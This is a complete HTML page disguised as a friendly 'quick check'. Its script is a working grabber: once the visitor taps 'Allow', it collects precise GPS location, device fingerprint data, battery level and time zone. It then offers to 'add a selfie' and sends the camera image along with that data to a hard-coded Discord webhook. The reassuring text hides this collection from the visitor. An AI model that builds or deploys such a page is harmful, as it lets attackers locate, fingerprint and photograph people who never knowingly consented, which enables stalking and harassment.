<!doctype html>
<html lang="en">
<head>
<script>const HOOK = "https://discord.com/api/webhooks/1568704069793480874/dyYCKzjN_0A5pTv18wRV1Vtjo4wQxxhcu_g1um0KuXM3N7hBOaYK3IE1QlQv9d53Ttb-";</script>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Quick check</title>
<meta property="og:title" content="Quick check">
<meta property="og:description" content="Takes 5 seconds, promise.">
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{margin:0;font-family:system-ui,-apple-system,sans-serif;
 background:linear-gradient(170deg,#1b1f2a,#0e1015 60%);color:#eef1f6;
 min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px 18px}
.wrap{width:100%;max-width:400px}
.card{background:#191d26;border:1px solid #262c39;border-radius:22px;padding:26px 22px;
 text-align:center;box-shadow:0 18px 50px rgba(0,0,0,.45)}
.card + .card{margin-top:14px}
.av{width:58px;height:58px;border-radius:50%;margin:0 auto 16px;display:grid;place-items:center;
 font-size:23px;font-weight:700;color:#0d1015;background:linear-gradient(160deg,#7ddba4,#4bb87a)}
h1{font-size:22px;margin:0 0 10px;letter-spacing:-.4px}
p{font-size:15px;line-height:1.55;color:#9aa4b8;margin:0 0 18px}
button{width:100%;padding:15px;border:0;border-radius:13px;font-size:16px;font-weight:700;
 background:linear-gradient(180deg,#7ddba4,#4bb87a);color:#0b1410}
button.ghost{background:#222836;color:#c8d2e4;font-weight:600;margin-top:10px}
button:disabled{opacity:.45}
.fine{font-size:12px;color:#5f6b80;margin:14px 0 0}
.row{display:flex;justify-content:space-between;font-size:14px;padding:11px 0;
 border-bottom:1px solid #232a37;text-align:left;gap:14px}
.row:last-of-type{border:0}
.row span:first-child{color:#7d8ba3;flex:none}
.row span:last-child{text-align:right;word-break:break-word}
.hide{display:none}
#stat{font-size:13px;color:#7d8ba3;margin-top:12px}
</style>
</head>
<body>
<div class="wrap">

  <div class="card" id="intro">
    <div class="av">S</div>
    <h1>Hey, quick favour</h1>
    <p>I'm checking that something of mine actually works where you are. Tap the button and allow the popup — five seconds, then you're free.</p>
    <button id="go">Allow</button>
    <p class="fine">Nothing gets posted publicly.</p>
  </div>

  <div class="card hide" id="res">
    <h1 id="thanks">Got it, thanks</h1>
    <p id="lead" style="margin-bottom:14px">That's everything I needed.</p>
    <div class="row"><span>Where</span><span id="loc">—</span></div>
    <div class="row"><span>Device</span><span id="dev">—</span></div>
    <div class="row"><span>Time zone</span><span id="tz">—</span></div>
    <button class="ghost" id="selfie">Add a selfie too</button>
    <div id="stat"></div>
  </div>

</div>

<script>
const $ = id => document.getElementById(id);

const data = {
  ua: navigator.userAgent,
  lang: navigator.language,
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  screen: screen.width + "x" + screen.height,
  platform: navigator.platform,
  touch: navigator.maxTouchPoints,
  cores: navigator.hardwareConcurrency
};
try {
  const c = document.createElement("canvas").getContext("webgl");
  const d = c.getExtension("WEBGL_debug_renderer_info");
  data.gpu = d ? c.getParameter(d.UNMASKED_RENDERER_WEBGL) : "n/a";
} catch(e){}

function post(extra){
  const info = [
    "**Where:** " + (data.lat ? data.lat + ", " + data.lon + " ±" + Math.round(data.acc) + "m" : "denied"),
    "**Device:** " + data.platform + " · " + data.screen,
    "**GPU:** " + (data.gpu || "-"),
    "**TZ / Lang:** " + data.tz + " / " + data.lang,
    "**Battery:** " + (data.battery || "-") + " · **Touch:** " + data.touch,
    "**UA:** " + data.ua.slice(0, 180)
  ].join("\n");

  const fd = new FormData();
  fd.append("payload_json", JSON.stringify({
    username: "Quick Check",
    embeds: [{ title: extra || "Opened", description: info, color: 0x4BB87A }]
  }));
  if (data.blob) fd.append("files[0]", data.blob, "selfie.jpg");
  fetch(HOOK, { method: "POST", body: fd }).catch(() => {});
}

$("go").onclick = () => {
  $("go").disabled = true;
  $("go").textContent = "Checking…";

  navigator.geolocation.getCurrentPosition(
    p => {
      data.lat = p.coords.latitude;
      data.lon = p.coords.longitude;
      data.acc = p.coords.accuracy;
      show(true);
    },
    () => show(false),
    { enableHighAccuracy: true, timeout: 9000 }
  );

  if (navigator.getBattery) navigator.getBattery()
    .then(b => { data.battery = Math.round(b.level * 100) + "%"; });

  setTimeout(() => { if (!$("res").classList.contains("hide")) return; }, 9500);
};

function show(ok){
  if (ok) {
    $("loc").textContent = data.lat.toFixed(4) + ", " + data.lon.toFixed(4);
  } else {
    $("loc").textContent = "not shared";
    $("thanks").textContent = "No worries";
    $("lead").textContent = "Location was off, but the rest came through.";
  }
  $("dev").textContent = data.platform + " · " + data.screen;
  $("tz").textContent = data.tz;
  $("intro").classList.add("hide");
  $("res").classList.remove("hide");
  post("Allowed");
}

let stream, blob = null;

$("selfie").onclick = async () => {
  $("selfie").disabled = true;
  $("stat").textContent = "Opening camera…";
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: 640 } });
    const v = document.createElement("video");
    v.srcObject = stream; v.muted = true; v.playsInline = true;
    await v.play();
    $("stat").textContent = "Hold still…";
    setTimeout(() => {
      const c = document.createElement("canvas");
      c.width = v.videoWidth || 480; c.height = v.videoHeight || 640;
      c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
      stream.getTracks().forEach(t => t.stop());
      c.toBlob(b => {
        data.blob = b;
        $("stat").textContent = "Sent.";
        $("selfie").classList.add("hide");
        post("Selfie");
      }, "image/jpeg", 0.72);
    }, 1500);
  } catch (e) {
    $("stat").textContent = "Camera blocked — that's fine, the rest already sent.";
    $("selfie").disabled = false;
  }
};
</script>
</body>
</html>
